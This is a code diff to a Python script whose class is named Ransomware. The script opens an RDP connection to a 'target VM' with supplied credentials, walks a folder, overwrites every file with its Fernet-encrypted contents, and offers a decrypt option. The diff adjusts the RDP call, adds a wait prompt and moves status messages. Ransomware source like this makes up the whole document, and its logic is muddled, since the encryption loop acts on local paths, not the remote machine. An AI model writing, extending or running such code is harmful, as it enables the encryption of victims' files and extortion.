@@ -23,7 +23,10 @@ class Ransomware:
     def encrypt_folder_on_vm(self, target_vm_ip, folder_path, rdp_username, rdp_password):
         # Establish RDP connection
         rdp_command = f"rdesktop -u {rdp_username} -p {rdp_password} {target_vm_ip}"
-        subprocess.run(rdp_command, shell=True)
+        subprocess.Popen(rdp_command, shell=True)
+
+        # Wait for RDP connection to be established
+        input("Press Enter once the RDP connection is established.")
 
         for root, dirs, files in os.walk(folder_path):
             for file in files:
@@ -36,6 +39,8 @@ class Ransomware:
 
                 with open(file_path, 'wb') as f:
                     f.write(encrypted)
+
+        print("Encryption completed on the target VM.")
 
     # Decrypt files using the Fernet symmetric key
     def decrypt_folder(self, folder_path):
@@ -50,6 +55,8 @@ class Ransomware:
 
                 with open(file_path, 'wb') as f:
                     f.write(decrypted)
+
+        print("Decryption completed.")
 
 
 # Create an instance of the Ransomware class
@@ -67,10 +74,8 @@ if choice == "1":
     rdp_username = input("Enter your RDP username: ")
     rdp_password = input("Enter your RDP password: ")
     ransomware.encrypt_folder_on_vm(target_vm_ip, folder_path, rdp_username, rdp_password)
-    print("Encryption completed on the target VM.")
 elif choice == "2":
     folder_path = input("Enter the folder path to decrypt: ")
     ransomware.decrypt_folder(folder_path)
-    print("Decryption completed.")
 else:
     print("Invalid choice. Please choose a valid option.")
